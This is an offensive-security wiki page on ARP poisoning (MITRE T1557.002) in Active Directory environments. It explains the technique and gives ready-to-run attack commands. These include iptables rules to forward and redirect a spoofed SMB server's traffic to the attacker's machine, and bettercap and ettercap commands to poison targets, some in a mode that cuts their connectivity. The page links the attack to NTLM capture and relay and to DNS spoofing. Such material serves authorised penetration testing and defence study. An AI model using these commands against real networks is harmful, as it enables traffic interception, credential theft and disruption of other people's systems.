---
description: MITRE ATT&CK™ Sub-technique T1557.002
---

# 🛠️ ARP poisoning

{% hint style="danger" %}
Add PCredz [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz)
{% endhint %}

## Theory

The ARP \(Address Resolution Protocol\) is used to link IPv4 addresses with MAC addresses, allowing machines to communicate within networks. Since that protocol works in broadcast, attackers can try to impersonate machines by answering ARP requests \(_"Who is using address 192.168.56.1? I am!"_\) or by flooding the network with ARP announcements \(_"Hey everyone, nobody asked but I'm the one using address 192.168.56.1"_\). This is called ARP spoofing \(also called ARP poisoning\).

## Practice

{% hint style="danger" %}
Since spoofing every address in a subnet can cause temporary but severe disruption in that subnet, it is highly recommended to target specific addresses and machines while doing ARP spoofing.
{% endhint %}

There are multiple scenarios where ARP spoofing can be used to operate lateral movement within Active Directory domains. 

1. One could spoof an SMB server and route received SMB packets to internal capture or relay servers for [NTLM capture](../abusing-lm-and-ntlm/capturing-hashes.md) or [NTLM relay](../abusing-lm-and-ntlm/relay.md). 
2. One could also spoof the internal DNS server, so that DNS queries can be answered with fake resolution \([DNS spoofing](dns-spoofing.md)\).

### Preparation

In order to conduct ARP spoofing attacks, the attacker's machine needs to be prepared accordingly \(IP forwarding enabled, outgoing ICMP dropped, internal traffic rerouted\).

```bash
# IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# outgoing ICMP drop (prevents sending port/host unreachable to target)
iptables -A OUTPUT -p ICMP -j DROP

# internal traffic rerouting of SMB packets (port 445, can be changed)
iptables --table nat --append PREROUTING --proto tcp --dst $SPOOFED_IP --dport 445 --jump DNAT --to-destination $ATTACKER_IP:445
```

### Spoofing

Tools like [ettercap](https://www.ettercap-project.org/) \(C\) of [bettercap](https://www.bettercap.org/) \(Go\) can then be used to flood the network with ARP announcements for a specific IP address.

{% tabs %}
{% tab title="Bettercap" %}
The following commands can be used, with parameters as follows

* `set arp.spoof.targets` to set the targets
* `set arp.spoof.internal true` to make bettercap spoof local connections among computers of the network
* `arp.ban on` to start the spoofer in ban mode, meaning the target\(s\) connectivity will not work
* `arp.spoof` on to start the spoofer

```bash
set arp.spoof.targets $TARGET_TO_POISON_IP
set arp.spoof.internal true
arp.ban on
arp.spoof on
```
{% endtab %}

{% tab title="Ettercap" %}
While bettercap is now usally a better alternative to ettercap, the following command can be used for ARP spoofing.

```bash
ettercap --text --quiet --nopromisc --mitm arp:remote /$SWITCH_IP// /$TARGET_TO_POISON_IP//
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="http://g-laurent.blogspot.com/2016/10/introducing-responder-multirelay-10.html" %}

{% embed url="https://luemmelsec.github.io/Relaying-101/\#arp-spoofing" %}

{% embed url="https://www.bettercap.org/modules/ethernet/spoofers/arp.spoof/" %}

{% embed url="https://ivanitlearning.wordpress.com/2019/04/07/arp-dns-poisoning-with-bettercap-and-impacket-ntlmrelayx/" %}

